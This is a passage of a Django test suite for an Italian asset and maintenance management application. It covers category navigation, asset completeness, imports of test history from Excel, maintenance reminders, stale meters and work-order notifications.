        self.assertEqual(burner_cat.base_asset_type, Asset.TYPE_OTHER)
        self.assertEqual(burner.asset_type, Asset.TYPE_OTHER)
        # Asset senza categoria non viene toccato.
        self.assertEqual(orphan.asset_type, Asset.TYPE_OTHER)

    def test_dry_run_does_not_persist(self):
        cat = AssetCategory.objects.create(
            code="server", label="Server", base_asset_type=Asset.TYPE_OTHER
        )
        asset = Asset.objects.create(asset_tag="IT-000010", name="Srv", asset_type=Asset.TYPE_OTHER, asset_category=cat)

        call_command("realign_asset_types", dry_run=True, stdout=io.StringIO())

        cat.refresh_from_db()
        asset.refresh_from_db()
        self.assertEqual(cat.base_asset_type, Asset.TYPE_OTHER)
        self.assertEqual(asset.asset_type, Asset.TYPE_OTHER)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class CategorySidebarTests(TestCase):
    """Navigazione asset guidata dall'albero categorie."""

    def setUp(self):
        self.user = User.objects.create_superuser(username="cat-nav-user", password="pass12345")
        _complete_onboarding(self.user)
        self.root = AssetCategory.objects.create(code="it", label="Information Technology")
        self.child_pc = AssetCategory.objects.create(code="it-pc", label="PC", parent=self.root)
        self.child_srv = AssetCategory.objects.create(code="it-srv", label="Server", parent=self.root)
        self.other_root = AssetCategory.objects.create(code="hvac", label="HVAC")
        self.other_child = AssetCategory.objects.create(code="hvac-bru", label="Bruciatori", parent=self.other_root)

        self.pc = Asset.objects.create(asset_tag="IT-000001", name="PC uno", asset_category=self.child_pc)
        self.srv = Asset.objects.create(asset_tag="IT-000002", name="Server uno", asset_category=self.child_srv)
        self.burner = Asset.objects.create(asset_tag="AST-000001", name="Bruciatore", asset_category=self.other_child)

    def test_rebuild_creates_groups_and_items(self):
        from assets.services.sidebar_categories import rebuild_category_sidebar

        # Pulsante legacy che deve sparire dopo il rebuild.
        AssetSidebarButton.objects.create(
            code="dispositivi_it", section=AssetSidebarButton.SECTION_MAIN, label="Dispositivi IT"
        )

        # Il conteggio atteso e' derivato dal DB: oltre alle categorie create
        # qui, le migration possono seminare radici (es. "Novicrom" dalla 0073).
        # Il contratto del rebuild e' "un gruppo per radice attiva, una voce per
        # figlia attiva", quindi confrontiamo con i conteggi reali.
        expected_groups = AssetCategory.objects.filter(
            parent__isnull=True, is_active=True
        ).count()
        expected_items = AssetCategory.objects.filter(
            parent__isnull=False, is_active=True
        ).count()

        groups, items = rebuild_category_sidebar(AssetCategory, AssetSidebarButton)
        self.assertEqual(groups, expected_groups)
        self.assertEqual(items, expected_items)
        self.assertGreaterEqual(groups, 2)  # almeno Information Technology + HVAC
        self.assertGreaterEqual(items, 3)   # almeno PC, Server, Bruciatori

        self.assertFalse(AssetSidebarButton.objects.filter(code="dispositivi_it").exists())
        root_btn = AssetSidebarButton.objects.get(code=f"catnav-root-{self.root.id}")
        self.assertEqual(root_btn.label, "Information Technology")
        self.assertFalse(root_btn.is_subitem)

        pc_btn = AssetSidebarButton.objects.get(code=f"catnav-{self.child_pc.id}")
        self.assertTrue(pc_btn.is_subitem)
        self.assertEqual(pc_btn.parent_id, root_btn.id)
        self.assertIn(f"asset_category={self.child_pc.id}", pc_btn.target_url)
        # I report restano raggiungibili.
        self.assertTrue(AssetSidebarButton.objects.filter(code="report_asset").exists())

    def test_subtree_ids_include_descendants(self):
        from assets.views import _category_subtree_ids

        ids = _category_subtree_ids(self.root)
        self.assertIn(self.root.id, ids)
        self.assertIn(self.child_pc.id, ids)
        self.assertIn(self.child_srv.id, ids)
        self.assertNotIn(self.other_child.id, ids)

    def test_asset_list_root_category_shows_whole_subtree(self):
        self.client.force_login(self.user)
        response = self.client.get(f"{reverse('assets:asset_list')}?asset_category={self.root.id}")
        self.assertEqual(response.status_code, 200)
        body = response.content.decode("utf-8")
        self.assertIn("IT-000001", body)
        self.assertIn("IT-000002", body)
        self.assertNotIn("AST-000001", body)

    def test_asset_list_leaf_category_shows_only_that_category(self):
        self.client.force_login(self.user)
        response = self.client.get(f"{reverse('assets:asset_list')}?asset_category={self.child_pc.id}")
        self.assertEqual(response.status_code, 200)
        body = response.content.decode("utf-8")
        self.assertIn("IT-000001", body)
        self.assertNotIn("IT-000002", body)




class AssetCompletenessTests(TestCase):
    """#5 — completezza scheda asset (% + campi mancanti)."""

    def test_core_fields_missing_lower_pct(self):
        # Solo name valorizzato (asset_tag autogenerato): molti core mancanti.
        asset = Asset.objects.create(name="PC Ufficio")
        c = asset.completeness()
        self.assertEqual(c["total"], 7)  # 6 core + assegnatario
        self.assertEqual(c["filled"], 1)  # solo name
        self.assertLess(c["pct"], 50)
        self.assertIn("Numero di serie", c["missing"])
        self.assertIn("Assegnatario", c["missing"])

    def test_full_core_is_100(self):
        asset = Asset.objects.create(
            name="PC", serial_number="SN1", manufacturer="Dell", model="X1",
            reparto="IT", purchase_date=date(2025, 1, 1), assignment_to="Mario Rossi",
        )
        c = asset.completeness()
        self.assertEqual(c["pct"], 100)
        self.assertEqual(c["missing"], [])

    def test_assignment_via_legacy_user_id_counts(self):
        asset = Asset.objects.create(name="PC", assigned_legacy_user_id=42)
        c = asset.completeness()
        self.assertNotIn("Assegnatario", c["missing"])

    def test_required_category_field_counts_and_bool_excluded(self):
        from assets.models import AssetCategory, AssetCategoryField

        cat = AssetCategory.objects.create(code="cnc", label="CNC")
        AssetCategoryField.objects.create(
            category=cat, code="potenza", label="Potenza kW",
            field_type=AssetCategoryField.TYPE_NUMBER, is_required=True,
        )
        AssetCategoryField.objects.create(
            category=cat, code="ha_aspiratore", label="Ha aspiratore",
            field_type=AssetCategoryField.TYPE_BOOL, is_required=True,
        )
        # Non required: non deve contare.
        AssetCategoryField.objects.create(
            category=cat, code="note_extra", label="Note extra",
            field_type=AssetCategoryField.TYPE_TEXT, is_required=False,
        )
        asset = Asset.objects.create(name="Tornio", asset_category=cat, extra_columns={})
        c = asset.completeness()
        # 7 core + 1 category required non-bool (potenza). Il BOOL e il non-required esclusi.
        self.assertEqual(c["total"], 8)
        self.assertIn("Potenza kW", c["missing"])
        self.assertNotIn("Ha aspiratore", c["missing"])
        self.assertNotIn("Note extra", c["missing"])

        asset.extra_columns = {"potenza": "15"}
        asset.save()
        c2 = asset.completeness()
        self.assertNotIn("Potenza kW", c2["missing"])

    def test_completeness_pct_property(self):
        asset = Asset.objects.create(
            name="PC", serial_number="SN1", manufacturer="Dell", model="X1",
            reparto="IT", purchase_date=date(2025, 1, 1), assignment_to="Tizio",
        )
        self.assertEqual(asset.completeness_pct, 100)


class PlantLayoutOpenTicketsTests(TestCase):
    """#5 — overlay ticket aperti sulla mappa officina."""

    def test_open_tickets_by_asset_groups_and_filters(self):
        from assets.views import _open_tickets_by_asset

        asset_a = Asset.objects.create(name="Tornio A", asset_type=Asset.TYPE_WORK_MACHINE)
        asset_b = Asset.objects.create(name="Fresa B", asset_type=Asset.TYPE_WORK_MACHINE)

        t_open = Ticket.objects.create(titolo="Guasto A", stato=StatoTicket.APERTA, asset=asset_a)
        Ticket.objects.create(titolo="In carico A", stato=StatoTicket.IN_CARICO, asset=asset_a)
        Ticket.objects.create(titolo="Chiuso A", stato=StatoTicket.CHIUSO, asset=asset_a)

        result = _open_tickets_by_asset([asset_a.id, asset_b.id])

        self.assertEqual(len(result[asset_a.id]), 2)  # aperta + in carico, non il chiuso
        self.assertNotIn(asset_b.id, result)  # nessun ticket → assente
        numeri = {row["titolo"] for row in result[asset_a.id]}
        self.assertIn("Guasto A", numeri)
        self.assertNotIn("Chiuso A", numeri)
        self.assertTrue(any(row["id"] == t_open.id for row in result[asset_a.id]))

    def test_open_tickets_by_asset_empty_input(self):
        from assets.views import _open_tickets_by_asset

        self.assertEqual(_open_tickets_by_asset([]), {})


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class ImportCollaudoHistoryTests(TestCase):
    """Import storico collaudo -> WorkOrder storici, guidato dal foglio di riconciliazione."""

    STORICO_HEADER = [
        "Data Pianif.", "Dt.Ult.Coll.", "Cod. Test", "Descrizione Test di Collaudo",
        "C.di Lav.", "Descrizione Centro di Lavoro", "Macc.Ut.",
        "Descrizione Macchina Utensile", "Codice Ciclo di Collaudo", "Commento",
    ]

    def _storico(self, path, rows):
        wb = Workbook()
        ws = wb.active
        ws.append(self.STORICO_HEADER)
        for r in rows:
            ws.append(r)
        wb.save(path)

    def _mapping(self, path, rows):
        wb = Workbook()
        ws = wb.active
        ws.append(["Centro", "Macc.Ut.", "CONFERMA (tag / NUOVO / SALTA)"])
        for r in rows:
            ws.append(r)
        wb.save(path)

    def _seed(self):
        asset = Asset.objects.create(asset_tag="TEST-DM3", name="DM3", asset_type=Asset.TYPE_CNC)
        MaintenanceInterventionTemplate.objects.create(code="caus-09", label="Cambio Olio")
        MaintenanceInterventionTemplate.objects.create(code="caus-24", label="Cinematica")
        return asset

    def _rows(self):
        # 2 righe macchina confermata, 1 macchina non confermata, 1 centro formazione
        return [
            [date(2030, 1, 1), date(2020, 1, 1), "09", "Cambio Olio", "CN5", "Centri CN5",
             "203", "DM3 - DMC 85", "C1", "Anno 2020"],
            [date(2030, 6, 1), date(2020, 6, 1), "24", "Cinematica", "CN5", "Centri CN5",
             "203", "DM3 - DMC 85", "C2", "A: ROSSI MARIO; BIANCHI LUIGI"],
            [date(2030, 1, 1), date(2020, 1, 1), "09", "Cambio Olio", "CN5", "Centri CN5",
             "999", "Macchina non confermata", "C3", ""],
            [date(2026, 1, 1), date(2021, 1, 1), "A11", "Corso Esterno", "919",
             "*** AMBIENTE E SICUREZZA ***", "01", "Accordo Stato Regioni", "C4", "A: TIZIO CAIO"],
        ]

    def test_import_crea_odl_storici_solo_per_macchine_confermate(self):
        asset = self._seed()
        with _workspace_temporary_directory("collaudo-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"], ["CN5", "999", ""]])

            out = io.StringIO()
            call_command("import_collaudo_history", storico=str(storico), mapping=str(mapping),
                         commit=True, stdout=out)

            wos = list(WorkOrder.objects.filter(asset=asset).order_by("opened_at"))
            self.assertEqual(len(wos), 2)  # solo la macchina confermata 203, non la 999 ne il centro 919
            self.assertTrue(all(w.status == WorkOrder.STATUS_DONE for w in wos))
            self.assertTrue(all(w.origin == WorkOrder.ORIGIN_PERIODIC for w in wos))
            self.assertEqual(wos[0].opened_at.year, 2020)
            self.assertEqual(wos[0].kind, WorkOrder.KIND_PREVENTIVE)  # causale numerica
            # commento sanificato: la lista presenze "A: ..." viene tagliata
            self.assertNotIn("ROSSI MARIO", wos[1].notes)

    def test_import_idempotente(self):
        asset = self._seed()
        with _workspace_temporary_directory("collaudo-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"]])

            for _ in range(2):
                call_command("import_collaudo_history", storico=str(storico), mapping=str(mapping),
                             commit=True, stdout=io.StringIO())

            self.assertEqual(WorkOrder.objects.filter(asset=asset).count(), 2)

    def test_dry_run_non_scrive(self):
        asset = self._seed()
        with _workspace_temporary_directory("collaudo-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"]])

            out = io.StringIO()
            call_command("import_collaudo_history", storico=str(storico), mapping=str(mapping),
                         dry_run=True, stdout=out)

            self.assertEqual(WorkOrder.objects.filter(asset=asset).count(), 0)
            self.assertIn("DRY-RUN", out.getvalue())


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class DeriveCollaudoRulesTests(TestCase):
    """Derivazione MaintenanceRule + AssetMaintenanceRuleState dalle frequenze dello storico."""

    STORICO_HEADER = [
        "Data Pianif.", "Dt.Ult.Coll.", "Cod. Test", "Descrizione Test di Collaudo",
        "C.di Lav.", "Descrizione Centro di Lavoro", "Macc.Ut.",
        "Descrizione Macchina Utensile", "Codice Ciclo di Collaudo", "Commento",
    ]

    def _storico(self, path, rows):
        wb = Workbook()
        ws = wb.active
        ws.append(self.STORICO_HEADER)
        for r in rows:
            ws.append(r)
        wb.save(path)

    def _mapping(self, path, rows):
        wb = Workbook()
        ws = wb.active
        ws.append(["Centro", "Macc.Ut.", "CONFERMA (tag / NUOVO / SALTA)"])
        for r in rows:
            ws.append(r)
        wb.save(path)

    def _seed(self):
        cat = AssetCategory.objects.create(code="cnc-test", label="Macchine CNC Test")
        asset = Asset.objects.create(
            asset_tag="TEST-DM3", name="DM3", asset_type=Asset.TYPE_CNC, asset_category=cat,
        )
        MaintenanceInterventionTemplate.objects.create(code="caus-09", label="Cambio Olio")
        return cat, asset

    def _rows(self):
        # due esecuzioni a 182 giorni di gap (Data Pianif - Dt.Ult.) => frequenza semestrale
        return [
            [date(2020, 7, 1), date(2020, 1, 1), "09", "Cambio Olio", "CN5", "Centri CN5",
             "203", "DM3", "C1", ""],
            [date(2020, 12, 30), date(2020, 7, 1), "09", "Cambio Olio", "CN5", "Centri CN5",
             "203", "DM3", "C2", ""],
        ]

    def test_deriva_regola_e_stato(self):
        cat, asset = self._seed()
        with _workspace_temporary_directory("rules-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"]])

            call_command("derive_collaudo_rules", storico=str(storico), mapping=str(mapping),
                         commit=True, stdout=io.StringIO())

            rule = MaintenanceRule.objects.get(asset_category=cat, intervention_template__code="caus-09")
            self.assertEqual(rule.threshold_type, MaintenanceRule.THRESHOLD_DAYS)
            self.assertEqual(rule.threshold_value, 182)  # snappato a semestrale
            state = AssetMaintenanceRuleState.objects.get(asset=asset, base_rule=rule)
            self.assertEqual(state.last_execution_date, date(2020, 7, 1))  # ultima esecuzione

    def test_idempotente(self):
        cat, asset = self._seed()
        with _workspace_temporary_directory("rules-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"]])

            for _ in range(2):
                call_command("derive_collaudo_rules", storico=str(storico), mapping=str(mapping),
                             commit=True, stdout=io.StringIO())

            self.assertEqual(MaintenanceRule.objects.filter(asset_category=cat).count(), 1)
            self.assertEqual(AssetMaintenanceRuleState.objects.filter(asset=asset).count(), 1)

    def test_dry_run_non_scrive(self):
        cat, asset = self._seed()
        with _workspace_temporary_directory("rules-") as d:
            storico = Path(d) / "storico.xlsx"
            mapping = Path(d) / "map.xlsx"
            self._storico(storico, self._rows())
            self._mapping(mapping, [["CN5", "203", "TEST-DM3"]])

            out = io.StringIO()
            call_command("derive_collaudo_rules", storico=str(storico), mapping=str(mapping),
                         dry_run=True, stdout=out)

            self.assertEqual(MaintenanceRule.objects.filter(asset_category=cat).count(), 0)
            self.assertEqual(AssetMaintenanceRuleState.objects.filter(asset=asset).count(), 0)
            self.assertIn("DRY-RUN", out.getvalue())


class MaintenanceReminderCommandTests(TestCase):
    """Quick win Q1-Q5 — reminder manutenzione: scadute, contatori fermi, legacy, assegnatario, anti-rumore."""

    def setUp(self):
        self.today = timezone.localdate()
        self.category = AssetCategory.objects.create(
            code="cnc-remind", label="CNC reminder", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-REM-001",
            name="Tornio reminder",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _run(self, **kwargs):
        out = io.StringIO()
        call_command("send_maintenance_reminders", dry_run=True, stdout=out, **kwargs)
        return out.getvalue()

    def _deadline(self, *, days_from_today: int, title: str = "Revisione periodica"):
        return AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_REVISION,
            title=title,
            due_date=self.today + timedelta(days=days_from_today),
        )

    def _verification(self, *, days_from_today: int, name: str = "Verifica sicurezza", is_legacy: bool = False):
        return PeriodicVerification.objects.create(
            name=name,
            frequency_months=12,
            next_verification_date=self.today + timedelta(days=days_from_today),
            is_legacy=is_legacy,
        )

    # Q1 — le scadenze superate restano nel reminder, in cima
    def test_overdue_admin_deadline_is_reported(self):
        self._deadline(days_from_today=-10, title="Revisione scaduta")

        output = self._run()

        self.assertIn("SCADUTE", output)
        self.assertIn("SCADUTA da 10gg", output)
        self.assertIn("Revisione scaduta", output)

    def test_overdue_periodic_verification_is_reported(self):
        self._verification(days_from_today=-3, name="Verifica fune scaduta")

        output = self._run()

        self.assertIn("SCADUTA da 3gg", output)
        self.assertIn("Verifica fune scaduta", output)

    def test_overdue_section_precedes_upcoming_sections(self):
        self._deadline(days_from_today=-1, title="Scaduta ieri")
        self._deadline(days_from_today=30, title="Scade tra 30gg")

        output = self._run()

        self.assertLess(output.index("SCADUTE"), output.index("SCADENZE AMMINISTRATIVE nei prossimi"))
        self.assertIn("Scade tra 30gg", output)

    def test_no_reminder_when_nothing_due(self):
        self._deadline(days_from_today=400, title="Molto lontana")

        output = self._run()

        self.assertIn("Nessun promemoria da inviare", output)

    # Q5 — anti-rumore: la stessa scadenza non può stare in 30 mail identiche di fila
    def test_upcoming_cadence_is_entry_day_then_weekly_then_due_day(self):
        from assets.management.commands.send_maintenance_reminders import should_remind_upcoming

        reminded = [days for days in range(0, 31) if should_remind_upcoming(days, 30)]

        self.assertEqual(reminded, [0, 2, 9, 16, 23, 30])

    def test_overdue_and_meterless_rows_are_always_reminded(self):
        from assets.management.commands.send_maintenance_reminders import should_remind_upcoming

        self.assertTrue(should_remind_upcoming(-5, 30))
        self.assertTrue(should_remind_upcoming(None, 30))

    def test_throttled_upcoming_deadline_is_not_in_todays_mail(self):
        self._deadline(days_from_today=25, title="Fuori cadenza")

        output = self._run()

        self.assertIn("Nessun promemoria da inviare", output)

    def test_no_throttle_includes_every_upcoming_deadline(self):
        self._deadline(days_from_today=25, title="Fuori cadenza")

        output = self._run(no_throttle=True)

        self.assertIn("Fuori cadenza", output)

    def test_overdue_deadline_is_reminded_every_day_despite_throttle(self):
        self._deadline(days_from_today=-25, title="Scaduta da un mese")

        output = self._run()

        self.assertIn("Scaduta da un mese", output)

    # Q3 — le verifiche legacy sono già coperte dalle regole: nella mail arrivavano due volte
    def test_legacy_verifications_are_excluded(self):
        self._verification(days_from_today=5, name="Verifica gestita da regola", is_legacy=True)
        self._verification(days_from_today=-5, name="Verifica legacy scaduta", is_legacy=True)
        self._verification(days_from_today=5, name="Verifica canonica")

        # no_throttle: qui si verifica il filtro legacy, non la cadenza (Q5).
        output = self._run(no_throttle=True)

        self.assertNotIn("Verifica gestita da regola", output)
        self.assertNotIn("Verifica legacy scaduta", output)
        self.assertIn("Verifica canonica", output)


class MeterStalenessTests(TestCase):
    """Quick win Q2 — contatore assente o fermo: una manutenzione a ore invisibile o falsamente verde."""

    def setUp(self):
        self.category = AssetCategory.objects.create(
            code="cnc-stale", label="CNC staleness", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="tagliando-stale", label="Tagliando ore", asset_category=self.category,
        )
        self.rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_HOURS,
            threshold_value=500,
            warning_days=50,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-STALE-001",
            name="Tornio contatore fermo",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _set_meter(self, value, *, days_since_update: int = 0):
        meter = AssetMeter.objects.create(
            asset=self.asset, meter_type=AssetMeter.METER_HOURS, current_value=value, unit_label="h",
        )
        if days_since_update:
            # update() bypassa auto_now: è l'unico modo per simulare un contatore fermo.
            AssetMeter.objects.filter(pk=meter.pk).update(
                updated_at=timezone.now() - timedelta(days=days_since_update)
            )
        return meter

    def _rows(self):
        return build_maintenance_schedule_rows(
            asset_queryset=Asset.objects.filter(pk=self.asset.id).select_related("asset_category")
        )

    def test_missing_meter_row_is_danger_not_muted(self):
        row = self._rows()[0]

        self.assertEqual(row["schedule_status"], "missing")
        self.assertEqual(row["schedule_badge_class"], "danger")

    def test_missing_rows_sort_before_upcoming(self):
        other_asset = Asset.objects.create(
            asset_tag="CNC-STALE-002",
            name="Tornio con contatore",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        AssetMeter.objects.create(
            asset=other_asset, meter_type=AssetMeter.METER_HOURS, current_value=10, unit_label="h",
        )

        rows = build_maintenance_schedule_rows()

        self.assertEqual(rows[0]["asset"].id, self.asset.id)
        self.assertEqual(rows[0]["schedule_status"], "missing")
        self.assertEqual(rows[1]["schedule_status"], "upcoming")

    def test_fresh_meter_is_not_stale(self):
        self._set_meter(100)

        row = self._rows()[0]

        self.assertFalse(row["meter_is_stale"])
        self.assertEqual(row["meter_days_since_update"], 0)

    def test_stale_meter_is_flagged_even_when_schedule_is_green(self):
        self._set_meter(100, days_since_update=45)

        row = self._rows()[0]

        self.assertEqual(row["schedule_status"], "upcoming")
        self.assertTrue(row["meter_is_stale"])
        self.assertEqual(row["meter_days_since_update"], 45)

    def test_stale_threshold_is_configurable_via_siteconfig(self):
        from core.models import SiteConfig

        self._set_meter(100, days_since_update=20)
        self.assertFalse(self._rows()[0]["meter_is_stale"])

        SiteConfig.objects.create(chiave="assets_meter_stale_days", valore="15")

        self.assertTrue(self._rows()[0]["meter_is_stale"])

    def test_reminder_reports_missing_meter_and_stale_meter(self):
        out = io.StringIO()
        call_command("send_maintenance_reminders", dry_run=True, stdout=out)
        missing_output = out.getvalue()

        self._set_meter(100, days_since_update=45)
        out = io.StringIO()
        call_command("send_maintenance_reminders", dry_run=True, stdout=out)
        stale_output = out.getvalue()

        self.assertIn("NON VALUTABILI", missing_output)
        self.assertIn("Contatore h mancante", missing_output)
        self.assertIn("CONTATORI FERMI DA ALMENO 30 GIORNI", stale_output)
        self.assertIn("45gg senza letture", stale_output)
        self.assertIn("CNC-STALE-001", stale_output)


class WorkOrderAssigneeNotificationTests(TestCase):
    """Quick win Q4 — assigned_to esisteva ma non riceveva nulla: il push era solo collettivo."""

    TECNICO_LEGACY_ID = 9001
    ADMIN_LEGACY_ID = 9002

    def setUp(self):
        from core.models import Profile

        User = get_user_model()
        self.admin = User.objects.create_superuser("wo-notif-admin", "wo-notif-admin@test.local", "pw")
        self.tecnico = User.objects.create_user("wo-notif-tecnico", "wo-notif-tecnico@test.local", "pw")
        Profile.objects.create(user=self.admin, legacy_user_id=self.ADMIN_LEGACY_ID)
        Profile.objects.create(user=self.tecnico, legacy_user_id=self.TECNICO_LEGACY_ID)
        self.category = AssetCategory.objects.create(
            code="cnc-notif", label="CNC notifiche", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-NOT-001",
            name="Tornio notifiche",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _notifiche(self, legacy_user_id: int):
        from core.models import Notifica

        return Notifica.objects.filter(legacy_user_id=legacy_user_id)

    def _create_payload(self, **extra):
        payload = {
            "periodic_verification": "",
            "supplier": "",
            "kind": WorkOrder.KIND_CORRECTIVE,
            "status": WorkOrder.STATUS_OPEN,
            "title": "Sostituzione cuscinetto",
            "description": "Rumore anomalo",
            "resolution": "",
            "downtime_minutes": "0",
            "cost_eur": "",
        }
        payload.update(extra)
        return payload

    def _open_workorder(self, *, assigned_to=None, days_open: int = 0):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Intervento aperto",
            assigned_to=assigned_to,
        )
        if days_open:
            WorkOrder.objects.filter(pk=workorder.pk).update(
                opened_at=timezone.now() - timedelta(days=days_open)
            )
            workorder.refresh_from_db()
        return workorder

    def test_create_notifies_the_assignee(self):
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            self._create_payload(assigned_to=str(self.tecnico.id)),
        )

        self.assertEqual(response.status_code, 302)
        workorder = WorkOrder.objects.get()
        notifica = self._notifiche(self.TECNICO_LEGACY_ID).get()
        self.assertIn("assegnato", notifica.messaggio)
        self.assertIn(workorder.title, notifica.messaggio)
        self.assertEqual(notifica.url_azione, f"/assets/workorders/view/{workorder.pk}/")

    def test_create_does_not_notify_when_assigning_to_yourself(self):
        self.client.force_login(self.admin)

        self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            self._create_payload(assigned_to=str(self.admin.id)),
        )

        self.assertEqual(self._notifiche(self.ADMIN_LEGACY_ID).count(), 0)

    def test_claim_notifies_the_previous_assignee(self):
        workorder = self._open_workorder(assigned_to=self.tecnico)
        self.client.force_login(self.admin)

        response = self.client.post(reverse("assets:wo_claim", args=[workorder.id]))

        self.assertEqual(response.status_code, 302)
        workorder.refresh_from_db()
        self.assertEqual(workorder.assigned_to, self.admin)
        notifica = self._notifiche(self.TECNICO_LEGACY_ID).get()
        self.assertIn("preso in carico", notifica.messaggio)

    def test_claim_of_unassigned_workorder_notifies_nobody(self):
        workorder = self._open_workorder()
        self.client.force_login(self.admin)

        self.client.post(reverse("assets:wo_claim", args=[workorder.id]))

        self.assertEqual(self._notifiche(self.TECNICO_LEGACY_ID).count(), 0)
        self.assertEqual(self._notifiche(self.ADMIN_LEGACY_ID).count(), 0)

    def test_reminder_notifies_the_assignee_of_an_overdue_workorder(self):
        workorder = self._open_workorder(assigned_to=self.tecnico, days_open=40)
        out = io.StringIO()

        call_command(
            "send_maintenance_reminders",
            recipients=["manutenzione@test.local"],
            stdout=out,
        )

        notifica = self._notifiche(self.TECNICO_LEGACY_ID).get()
        self.assertIn(f"#{workorder.pk}", notifica.messaggio)
        self.assertIn("aperto da 40 giorni", notifica.messaggio)
        self.assertIn("NotificheAssegnatari=1", out.getvalue())


class WorkOrderOverdueThresholdTests(TestCase):
    """Quick win Q6 — la soglia 'OdL in ritardo' era ricopiata a mano in più punti."""

    def setUp(self):
        from core.models import SiteConfig

        User = get_user_model()
        self.admin = User.objects.create_superuser("wo-thr-admin", "wo-thr-admin@test.local", "pw")
        self.category = AssetCategory.objects.create(
            code="cnc-thr", label="CNC soglia", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-THR-001",
            name="Tornio soglia",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        self.workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Aperto da 10 giorni",
        )
        WorkOrder.objects.filter(pk=self.workorder.pk).update(
            opened_at=timezone.now() - timedelta(days=10)
        )
        self.SiteConfig = SiteConfig

    def test_default_threshold_is_21_days(self):
        from assets.maintenance import get_workorder_overdue_days

        self.assertEqual(get_workorder_overdue_days(), 21)

    def test_siteconfig_threshold_drives_cockpit_and_reminder_together(self):
        self.SiteConfig.objects.create(chiave="assets_wo_overdue_days", valore="7")
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_hub"))
        out = io.StringIO()
        call_command("send_maintenance_reminders", dry_run=True, stdout=out)

        self.assertEqual(list(response.context["wo_overdue"]), [self.workorder])
        self.assertIn("OdL APERTI DA PIÙ DI 7 GIORNI", out.getvalue())

    def test_workorder_is_not_overdue_below_the_threshold(self):
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:maintenance_hub"))
        out = io.StringIO()
        call_command("send_maintenance_reminders", dry_run=True, stdout=out)

        self.assertEqual(list(response.context["wo_overdue"]), [])
        self.assertNotIn("OdL APERTI", out.getvalue())


class MaintenanceExecutionVsGeneratorTests(TestCase):
    """C1 — l'esecuzione registrata dallo scadenzario e il generatore devono guardare la stessa verità."""

    def setUp(self):
        User = get_user_model()
        self.admin = User.objects.create_superuser("gen-admin", "gen-admin@test.local", "pw")
        self.category = AssetCategory.objects.create(
            code="cnc-gen", label="CNC generatore", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="lubrificazione-gen", label="Lubrificazione", asset_category=self.category,
        )
        self.rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            warning_days=15,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-GEN-001",
            name="Tornio generatore",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _record_execution_from_schedule(self, *, executed_on=None):
        """Percorso reale: POST allo scadenzario, non una scorciatoia sul modello."""
        self.client.force_login(self.admin)
        return self.client.post(
            reverse("assets:maintenance_schedule"),
            {
                "action": "record_maintenance_rule_execution",
                "asset_id": str(self.asset.id),
                "base_rule_id": str(self.rule.id),
                "execution_date": (executed_on or timezone.localdate()).isoformat(),
                "execution_duration_minutes": "30",
                "execution_cost_eur": "",
                "execution_notes": "Lubrificato e verificato.",
            },
        )

    def test_execution_recorded_from_schedule_is_seen_by_the_generator(self):
        response = self._record_execution_from_schedule()
        self.assertEqual(response.status_code, 302)
        executed = WorkOrder.objects.get(asset=self.asset, maintenance_rule=self.rule)
        self.assertEqual(executed.status, WorkOrder.STATUS_DONE)

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        # La manutenzione è appena stata fatta: il generatore non deve riaprirla.
